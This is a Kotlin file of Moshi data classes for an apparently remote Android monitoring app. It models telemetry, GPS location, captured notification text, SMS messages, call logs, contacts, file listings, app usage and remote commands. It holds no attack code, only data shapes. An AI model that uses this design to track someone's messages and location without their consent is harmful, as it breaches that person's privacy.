package com.example.data.model

import com.squareup.moshi.JsonClass

@JsonClass(generateAdapter = true)
data class DeviceTelemetry(
    val deviceId: String,
    val deviceName: String,
    val manufacturer: String,
    val model: String,
    val osVersion: String,
    val sdkVersion: Int,
    val appVersion: String,
    val batteryLevel: Int,
    val isCharging: Boolean,
    val storageAvailableBytes: Long,
    val storageTotalBytes: Long,
    val ramAvailableBytes: Long,
    val ramTotalBytes: Long,
    val networkType: String,
    val wifiSsid: String?,
    val isWifiConnected: Boolean,
    val uptimeMillis: Long,
    val timestamp: Long = System.currentTimeMillis()
)

@JsonClass(generateAdapter = true)
data class LocationData(
    val deviceId: String,
    val latitude: Double,
    val longitude: Double,
    val accuracy: Float,
    val altitude: Double? = null,
    val speed: Float? = null,
    val provider: String? = null,
    val timestamp: Long = System.currentTimeMillis()
)

@JsonClass(generateAdapter = true)
data class NotificationData(
    val id: String = java.util.UUID.randomUUID().toString(),
    val deviceId: String,
    val packageName: String,
    val appName: String,
    val title: String,
    val text: String,
    val category: String? = null,
    val postTime: Long = System.currentTimeMillis()
)

@JsonClass(generateAdapter = true)
data class AppInfoData(
    val packageName: String,
    val appName: String,
    val versionName: String,
    val versionCode: Long,
    val isSystemApp: Boolean,
    val firstInstallTime: Long,
    val lastUpdateTime: Long
)

@JsonClass(generateAdapter = true)
data class UsageData(
    val packageName: String,
    val appName: String,
    val totalTimeInForegroundMs: Long,
    val lastTimeUsed: Long
)

@JsonClass(generateAdapter = true)
data class RemoteCommand(
    val commandId: String,
    val deviceId: String,
    val commandType: String,
    val parameters: Map<String, String>? = null,
    val status: String = "PENDING", // PENDING, RUNNING, COMPLETED, FAILED, CANCELLED
    val result: String? = null,
    val errorMessage: String? = null,
    val timestamp: Long = System.currentTimeMillis(),
    val completionTimestamp: Long? = null
)

@JsonClass(generateAdapter = true)
data class PairingRequest(
    val pairingCode: String,
    val deviceName: String,
    val manufacturer: String,
    val model: String,
    val osVersion: String
)

@JsonClass(generateAdapter = true)
data class PairingResponse(
    val success: Boolean,
    val deviceId: String?,
    val token: String?,
    val message: String?
)

@JsonClass(generateAdapter = true)
data class CommandStatusUpdate(
    val commandId: String,
    val deviceId: String,
    val status: String,
    val result: String? = null,
    val errorMessage: String? = null,
    val timestamp: Long = System.currentTimeMillis()
)

@JsonClass(generateAdapter = true)
data class DevicePermissionsStatus(
    val location: Boolean,
    val notificationAccess: Boolean,
    val filesAccess: Boolean,
    val camera: Boolean,
    val microphone: Boolean,
    val usageAccess: Boolean,
    val screenSharing: Boolean,
    val contacts: Boolean = false,
    val calls: Boolean = false,
    val sms: Boolean = false,
    val accessibility: Boolean = false
)

@JsonClass(generateAdapter = true)
data class AuthRequest(
    val email: String,
    val password: String,
    val username: String? = null
)

@JsonClass(generateAdapter = true)
data class UserData(
    val id: Int? = null,
    val username: String? = null,
    val email: String? = null,
    val role: String? = null
)

@JsonClass(generateAdapter = true)
data class AuthResponse(
    val token: String? = null,
    val user: UserData? = null,
    val error: String? = null
)

@JsonClass(generateAdapter = true)
data class RegisterDeviceRequest(
    val deviceName: String,
    val manufacturer: String,
    val model: String,
    val osVersion: String,
    val sdkVersion: Int = 34,
    val appVersion: String = "1.0"
)

@JsonClass(generateAdapter = true)
data class DeviceFileData(
    val fileName: String,
    val filePath: String,
    val fileSize: Long,
    val mimeType: String,
    val isDirectory: Boolean
)

@JsonClass(generateAdapter = true)
data class ContactData(
    val name: String,
    val phone: String,
    val email: String? = null
)

@JsonClass(generateAdapter = true)
data class SmsData(
    val address: String,
    val body: String,
    val type: String, // INBOX or SENT
    val timestamp: Long
)

@JsonClass(generateAdapter = true)
data class CallData(
    val number: String,
    val name: String?,
    val type: String, // INCOMING, OUTGOING, MISSED
    val duration: Long,
    val timestamp: Long
)


